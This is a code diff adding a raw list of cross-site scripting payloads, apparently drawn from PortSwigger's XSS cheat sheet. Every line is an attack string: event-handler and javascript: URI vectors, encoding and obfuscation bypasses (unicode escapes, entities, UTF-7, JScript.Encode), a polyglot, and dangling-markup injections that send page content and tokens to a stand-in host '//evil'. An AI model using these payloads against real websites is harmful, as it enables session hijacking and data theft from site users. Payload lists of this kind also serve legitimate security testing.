@@ -1,0 +1,169 @@
+<a id=x tabindex=1 onactivate=alert(1)></a>
+<body onafterprint=alert(1)>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><a id=x style=&quot;position:absolute;&quot; onanimationcancel=&quot;alert(1)&quot;></a>
+<style>@keyframes x{}</style><a style=&quot;animation-name:x&quot; onanimationend=&quot;alert(1)&quot;></a>
+<style>@keyframes slidein {}</style><a style=&quot;animation-duration:1s;animation-name:slidein;animation-iteration-count:2&quot; onanimationiteration=&quot;alert(1)&quot;></a>
+<style>@keyframes x{}</style><a style=&quot;animation-name:x&quot; onanimationstart=&quot;alert(1)&quot;></a>
+<a id=x tabindex=1 onbeforeactivate=alert(1)></a>
+<a id=x tabindex=1 onbeforedeactivate=alert(1)></a><input autofocus>
+<body onbeforeprint=alert(1)>
+<body onbeforeunload=&quot;location=&#039;javascript:alert(1)&#039;&quot;>
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+<a onblur=alert(1) tabindex=1 id=x></a><input autofocus>
+<marquee width=1 loop=1 onbounce=alert(1)>XSS</marquee>
+<audio oncanplay=alert(1)><source src=&quot;validaudio.wav&quot; type=&quot;audio/wav&quot;></audio>
+<video oncanplaythrough=alert(1)><source src=&quot;validvideo.mp4&quot; type=&quot;video/mp4&quot;></video>
+<a id=x tabindex=1 ondeactivate=alert(1)></a><input id=y autofocus>
+<svg><animate onend=alert(1) attributeName=x dur=1s>
+<audio controls autoplay onended=alert(1)><source src=&quot;validaudio.wav&quot; type=&quot;audio/wav&quot;></audio>
+<audio src/onerror=alert(1)>
+<marquee width=1 loop=1 onfinish=alert(1)>XSS</marquee>
+<a id=x tabindex=1 onfocus=alert(1)></a>
+<a id=x tabindex=1 onfocusin=alert(1)></a>
+<a onfocusout=alert(1) tabindex=1 id=x></a><input autofocus>
+<body onhashchange=&quot;alert(1)&quot;>
+<svg><a onload=alert(1)></a>
+<audio onloadeddata=alert(1)><source src=&quot;validaudio.wav&quot; type=&quot;audio/wav&quot;></audio>
+<audio autoplay onloadedmetadata=alert(1)> <source src=&quot;validaudio.wav&quot; type=&quot;audio/wav&quot;></audio>
+<img src=validimage.png onloadend=alert(1)>
+<img src=validimage.png onloadstart=alert(1)>
+<body onmessage=alert(1)>
+<body onpageshow=alert(1)>
+<audio autoplay onplay=alert(1)><source src=&quot;validaudio.wav&quot; type=&quot;audio/wav&quot;></audio>
+<audio autoplay onplaying=alert(1)><source src=&quot;validaudio.wav&quot; type=&quot;audio/wav&quot;></audio>
+<body onpopstate=alert(1)>
+<applet onreadystatechange=alert(1)></applet>
+<svg><animate onrepeat=alert(1) attributeName=x dur=1s repeatCount=2 />
+<body onresize=&quot;alert(1)&quot;>
+<body onscroll=alert(1)><div style=height:1000px></div><div id=x></div>
+<marquee onstart=alert(1)>XSS</marquee>
+<audio controls autoplay ontimeupdate=alert(1)><source src=&quot;validaudio.wav&quot; type=&quot;audio/wav&quot;></audio>
+<style>:target {color: red;}</style><a id=x style=&quot;transition:color 10s&quot; ontransitioncancel=alert(1)></a>
+<style>:target {color:red;}</style><a id=x style=&quot;transition:color 1s&quot; ontransitionend=alert(1)></a>
+<style>:target {transform: rotate(180deg);}</style><a id=x style=&quot;transition:transform 2s&quot; ontransitionrun=alert(1)></a>
+<body onunhandledrejection=alert(1)><script>fetch(&#039;//xyz&#039;)<\/script>
+<video autoplay controls onwaiting=alert(1)><source src=&quot;validvideo.mp4&quot; type=video/mp4></video>
+<input onauxclick=alert(1)>
+<a onbeforecopy="alert(1)" contenteditable>test</a>
+<a onbeforecut="alert(1)" contenteditable>test</a>
+<a onbeforepaste="alert(1)" contenteditable>test</a>
+<input onchange=alert(1) value=xss>
+<a onclick="alert(1)">test</a>
+<a oncontextmenu="alert(1)">test</a>
+<a oncopy="alert(1)" contenteditable>test</a>
+<a oncut="alert(1)" contenteditable>test</a>
+<a ondblclick="alert(1)">test</a>
+<a draggable="true" ondrag="alert(1)">test</a>
+<a draggable="true" ondragend="alert(1)">test</a>
+<a draggable="true" ondragenter="alert(1)">test</a>
+<a draggable="true" ondragleave="alert(1)">test</a>
+<div draggable="true" contenteditable>drag me</div><a ondragover=alert(1) contenteditable>drop here</a>
+<a draggable="true" ondragstart="alert(1)">test</a>
+<div draggable="true" contenteditable>drag me</div><a ondrop=alert(1) contenteditable>drop here</a>
+<input oninput=alert(1) value=xss>
+<form><input oninvalid=alert(1) required><input type=submit>
+<a onkeydown="alert(1)" contenteditable>test</a>
+<a onkeypress="alert(1)" contenteditable>test</a>
+<a onkeyup="alert(1)" contenteditable>test</a>
+<a onmousedown="alert(1)">test</a>
+<a onmouseenter="alert(1)">test</a>
+<a onmouseleave="alert(1)">test</a>
+<a onmousemove="alert(1)">test</a>
+<a onmouseout="alert(1)">test</a>
+<a onmouseover="alert(1)">test</a>
+<a onmouseup="alert(1)">test</a>
+<a onpaste="alert(1)" contenteditable>test</a>
+<audio autoplay controls onpause=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
+<form onreset=alert(1)><input type=reset>
+<form><input type=search onsearch=alert(1) value="Hit return" autofocus>
+<audio autoplay controls onseeked=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
+<audio autoplay controls onseeking=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
+<input onselect=alert(1) value="XSS" autofocus>
+<form onsubmit=alert(1)><input type=submit>
+<audio autoplay controls onvolumechange=alert(1)><source src="validaudio.wav" type="audio/wav"></audio>
+<body onwheel=alert(1)>
+<iframe src="javascript:alert(1)">
+<object data="javascript:alert(1)">
+<embed src="javascript:alert(1)">
+<a href="javascript:alert(1)">XSS</a>
+<a href="JaVaScript:alert(1)">XSS</a>
+<a href=" 	javascript:alert(1)">XSS</a>
+<a href="javas	cript:alert(1)">XSS</a>
+<svg><a xlink:href="javascript:alert(1)"><text x="20" y="20">XSS</text></a>
+<svg><animate xlink:href=#xss attributeName=href values=javascript:alert(1) /><a id=xss><text x=20 y=20>XSS</text></a>
+<script src="data:text/javascript,alert(1)"></script>
+<svg><script href="data:text/javascript,alert(1)" />
+<svg><use href="data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' width='100' height='100'><a xlink:href='javascript:alert(1)'><rect x='0' y='0' width='100' height='100' /></a></svg>#x"></use></svg>
+<script>import('data:text/javascript,alert(1)')</script>
+<base href="javascript:/a/-alert(1)///////"><a href=../lol/safari.html>test</a>
+<math><x href="javascript:alert(1)">blah
+<form><button formaction=javascript:alert(1)>XSS
+<form><input type=submit formaction=javascript:alert(1) value=XSS>
+<form action=javascript:alert(1)><input type=submit value=XSS>
+<isindex type=submit formaction=javascript:alert(1)>
+<isindex type=submit action=javascript:alert(1)>
+<iframe srcdoc="<img src=1 onerror=alert(1)>"></iframe>
+<iframe srcdoc="&amp;lt;img src=1 onerror=alert(1)&amp;gt;"></iframe>
+<form action="javascript:alert(1)"><input type=submit id=x></form><label for=x>XSS</label>
+<input type="hidden" accesskey="X" onclick="alert(1)"> (Press ALT+SHIFT+X on Windows) (CTRL+ALT+X on OS X)
+<link rel="canonical" accesskey="X" onclick="alert(1)" /> (Press ALT+SHIFT+X on Windows) (CTRL+ALT+X on OS X)
+<a href=# download="filename.html">Test</a>
+<img referrerpolicy="no-referrer" src="//portswigger-labs.net">
+<meta http-equiv="refresh" content="0; url=//portswigger-labs.net">
+<meta charset="UTF-7" /> +ADw-script+AD4-alert(1)+ADw-/script+AD4-
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-7" /> +ADw-script+AD4-alert(1)+ADw-/script+AD4-
+<meta http-equiv="Content-Security-Policy" content="upgrade-insecure-requests">
+<iframe sandbox src="//portswigger-labs.net"></iframe>
+<meta name="referrer" content="no-referrer">
+<script>\u0061lert(1)</script>
+<script>\u{61}lert(1)</script>
+<script>\u{0000000061}lert(1)</script>
+<script>eval('\x61lert(1)')</script>
+<a href="&amp;#106;avascript:alert(1)">XSS</a><a href="&amp;#106avascript:alert(1)">XSS</a>
+<a href="&amp;#0000106avascript:alert(1)">XSS</a>
+<a href="&amp;#x6a;avascript:alert(1)">XSS</a>
+<a href="&amp;#x0000006a;avascript:alert(1)">XSS</a>
+<a href="&amp;#X6A;avascript:alert(1)">XSS</a>
+<a href="javascript:x='%27-alert(1)-%27';">XSS</a>
+<a href="javascript:x='&amp;percnt;27-alert(1)-%27';">XSS</a>
+<a href="javascript&amp;#x6a;avascript:alert(1)">Firefox</a>
+<a href="javascript&amp;colon;alert(1)">Firefox</a>
+<link rel=stylesheet href="//evil?
+<link rel=icon href="//evil?
+<meta http-equiv="refresh" content="0; http://evil?
+<video><track default src="//evil?
+<video><source src="//evil?
+<audio><source src="//evil?
+<input type=image src="//evil?
+<form><button style="width:100%;height:100%" type=submit formaction="//evil?
+<form><input type=submit value="XSS" style="width:100%;height:100%" type=submit formaction="//evil?
+<button form=x style="width:100%;height:100%;"><form id=x action="//evil?
+<isindex type=image src="//evil?
+<isindex type=submit style=width:100%;height:100%; value=XSS formaction="//evil?
+<object data="//evil?
+<iframe src="//evil?
+<embed src="//evil?
+<form><button formaction=//evil>XSS</button><textarea name=x>
+<button form=x>XSS</button><form id=x action=//evil target='
+<a href=http://subdomain1.portswigger-labs.net/dangling_markup/name.html><font size=100 color=red>You must click me</font></a><base target="
+<form><input type=submit value="Click me" formaction=http://subdomain1.portswigger-labs.net/dangling_markup/name.html formtarget="
+<a href=abc style="width:100%;height:100%;position:absolute;font-size:1000px;">xss<base href="//evil/
+<embed src=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name="
+<iframe src=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name="
+<object data=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name="
+<frameset><frame src=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name="
+javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
+<img src="javascript:alert(1)">
+<body background="javascript:alert(1)">
+<iframe src="data:text/html,<img src=1 onerror=alert(document.domain)>">
+<a target="_blank" href="https://portswigger-labs.net/xss/xss.php?x=%3Ca%20href%3D%23%20language%3D%22JScript.Encode%22%20onclick%3D%22%23%40~%5ECAAAAA%3D%3DC%5E%2B.D%608%23mgIAAA%3D%3D%5E%23~%40%22%3EXSS%3C%2Fa%3E%0A%3Ca%20href%3D%23%20onclick%3D%22JScript.Encode%3A%23%40~%5ECAAAAA%3D%3DC%5E%2B.D%608%23mgIAAA%3D%3D%5E%23~%40%22%3EXSS%3C%2Fa%3E"><a href=# language="JScript.Encode" onclick="#@~^CAAAAA==C^+.D`8#mgIAAA==^#~@">XSS</a>
+<a href=# onclick="JScript.Encode:#@~^CAAAAA==C^+.D`8#mgIAAA==^#~@">XSS</a></a>
+<a target="_blank" href="https://portswigger-labs.net/xss/xss.php?x=%3Ciframe%20onload%3DVBScript.Encode%3A%23%40~%5ECAAAAA%3D%3D%5Cko%24K6%2CFoQIAAA%3D%3D%5E%23~%40%3E%0A%3Ciframe%20language%3DVBScript.Encode%20onload%3D%23%40~%5ECAAAAA%3D%3D%5Cko%24K6%2CFoQIAAA%3D%3D%5E%23~%40%3E"><iframe onload=VBScript.Encode:#@~^CAAAAA==\ko$K6,FoQIAAA==^#~@>
+<iframe language=VBScript.Encode onload=#@~^CAAAAA==\ko$K6,FoQIAAA==^#~@></a>
+<a title="&amp;{alert(1)}">XSS</a>
+<link href="xss.js" rel=stylesheet type="text/javascript">
+<form><button name=x formaction=x><b>stealme
+<form action=x><button>XSS</button><select name=x><option><plaintext><script>token="supersecret"</script>
+<img src="blah" style="-moz-binding: url(data:text/xml;charset=utf-8,%3C%3Fxml%20version%3D%221.0%22%3F%3E%3Cbindings%20xmlns%3D%22 http%3A//www.mozilla.org/xbl%22%3E%3Cbinding%20id%3D%22loader%22%3E%3Cimplementation%3E%3Cconstructor%3E%3C%21%5BCDATA%5Bvar%20url%20%3D%20%22alert.js %22%3B%20var%20scr%20%3D%20document.createElement%28%22script%22%29%3B%20scr.setAttribute%28%22src%22%2Curl%29%3B%20var%20bodyElement%20%3D%20 document.getElementsByTagName%28%22html%22%29.item%280%29%3B%20bodyElement.appendChild%28scr%29%3B%20%5D%5D%3E%3C/constructor%3E%3C/implementation%3E%3C/ binding%3E%3C/bindings%3E)" />
+<a style="behavior:url(#default#AnchorClick);" folder="javascript:alert(1)">XSS</a>
+<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS<img src=1 onerror=alert(1)>"> </BODY></HTML>
